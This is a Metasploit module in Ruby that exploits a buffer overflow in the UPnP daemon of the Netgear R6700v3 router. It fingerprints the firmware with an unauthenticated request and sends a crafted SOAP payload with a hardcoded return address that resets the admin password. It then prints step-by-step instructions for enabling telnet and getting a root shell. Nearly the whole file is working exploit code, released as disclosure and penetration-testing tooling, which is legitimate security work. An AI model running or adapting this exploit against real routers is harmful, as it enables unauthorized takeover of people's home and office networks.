##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Netgear R6700v3 Unauthenticated LAN Remote Code Execution',
        'Description'    => %q{
        This module exploits a buffer overflow vulnerability in the UPNP daemon (/usr/sbin/upnpd), running on
        the router Netgear R6700 Nighthawk, hardware version 3, ARM Architecture, firmware versions V1.0.0.4.82_10.0.57 and
        V1.0.0.4.84_10.0.58.
        The vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does
        not need any authentication to abuse it. After exploitation, an attacker can hijack execution of the upnpd binary,
        and reset the router's administrative password to "password". Next, a special packet to port 23/udp is sent
        which will enable a telnet server on port 23/tcp. The attacker can then login to this telnet server using the new password,
        and obtain a root shell.
        These last two steps have to be done manually, as the authors did not reverse the communication with the web interface.
        It should be noted that it is likely that earlier firmware versions are also vulnerable to this attack.
        This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro +
        Radek Domanski).
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Twitter: @pedrib1337. Vulnerability discovery and Metasploit module
          'Radek Domanski <radek.domanski[at]gmail.com>' # Twitter: @RabbitPro. Vulnerability discovery and Metasploit module
        ],
        'References'     =>
          [
            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md'],
            [ 'URL', 'https://kb.netgear.com/000061982/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Mobile-Routers-Modems-Gateways-and-Extenders'],
            [ 'CVE', 'YYYY-XXXXX'],
            [ 'ZDI', '20-703'],
            [ 'ZDI', '20-704']
          ],
        'DisclosureDate' => "Jun 15 2020",
        'DefaultTarget'   => 0,
      )
    )
    register_options(
      [
        Opt::RPORT(5000)
      ])
  end

  def get_offset
    soap =
    "<?xml version=\"1.0\"?>"\
    "\r\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"\
    "\r\n<SOAP-ENV:Body>"\
    "\r\nSetDeviceNameIconByMAC"\
    "\r\n<NewBlockSiteName>1"\
    "\r\n</NewBlockSiteName>"\
    "\r\n</SOAP-ENV:Body>"\
    "\r\n</SOAP-ENV:Envelope>"

    # the GetInfo method will helpfully report the firmware version to an unauth request
    headers = "SOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo"

    res = send_request_cgi({
      'uri' => '/soap/server_sa',
      'method'  => 'POST',
      'raw_headers'  => headers,
      'data'  => soap
    })

    if (res == nil)
      fail_with(Failure::Unreachable, "Failed to obtain device version: target didn't respond")
    elsif (res.code != 200)
      fail_with(Failure::UnexpectedReply, "Failed to obtain device version: unexpected response code")
    end

    if res.body.to_s =~ /V1.0.4.84/
      print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.")
      # this offset is where execution will jump to
      # a part in the middle of the binary that resets the admin password
      return "\x58\x9a\x03"
    elsif res.body.to_s =~ /V1.0.4.82/
      print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.")
      return "\x48\x9a\x03"
    end
  end

  def check
    if get_offset
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Unknown
    end
  end

  def run
    offset = get_offset
    if not offset
      fail_with(Failure::Unknown, "Unknown firmware version, can't proceed, please contact the authors")
    end

    headers =
    "SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\nSOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#Whatever"

    payload =
    "<?xml version=\"1.0\"?>"\
    "\r\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"\
    "\r\n<SOAP-ENV:Body>"\
    "\r\nSetDeviceNameIconByMAC"\
    "\r\n<NewBlockSiteName>1"

    # filler
    payload += Rex::Text::rand_text_alpha(1028)
    # $r4
    payload += Rex::Text::rand_text_alpha(4)
    # $r5
    payload += Rex::Text::rand_text_alpha(4)
    # $r6
    payload += Rex::Text::rand_text_alpha(4)
    # $r7
    payload += Rex::Text::rand_text_alpha(4)
    # $r8
    payload += Rex::Text::rand_text_alpha(4)
    # $lr (AKA return address)
    payload += offset

    # trailer
    payload +=
    "\r\n</NewBlockSiteName>"\
    "\r\n</SOAP-ENV:Body>"\
    "\r\n</SOAP-ENV:Envelope>"

    headers.gsub! "\n", "\r\n"
    payload.gsub! "\n", "\r\n"

    # MSF adds content len automatically.
    # Unfortunately this appears before the raw headers hash, but doesn't appear to have ill effects
    headers += "\r\n"

    res = send_request_cgi({
      'uri' => '/soap/server_sa',
      'method'  => 'POST',
      'raw_headers'  => headers,
      'data'  => payload
    })

    if res
      # no response is received in case of success
      fail_with(Failure::UnexpectedReply, 'Failed to send HTTP payload... try again?')
    else
      print_good("#{peer} - HTTP payload sent! 'admin' password has been reset to 'password'")
      print_status("To achieve code execution, do the following steps manually:")
      print_status("1- Login to #{rhost} with creds 'admin:password', then:")
      print_status("\t1.1- go to Advanced -> Administration -> Set Password")
      print_status("\t1.2- Change the password from 'password' to <WHATEVER>")
      print_status("2- Run metasploit as root, then:")
      print_status("\t2.1- use exploit/linux/telnet/netgear_telnetenable")
      print_status("\t2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>")
      print_status("\t2.3- set rhost #{rhost}")
      print_status("\t2.3- set username admin")
      print_status("\t2.4- set password <WHATEVER>")
      print_status("\t2.5- run it and login with 'admin:<WHATEVER>'")
      print_status("3- Enjoy your root shell!")
    end
  end
end
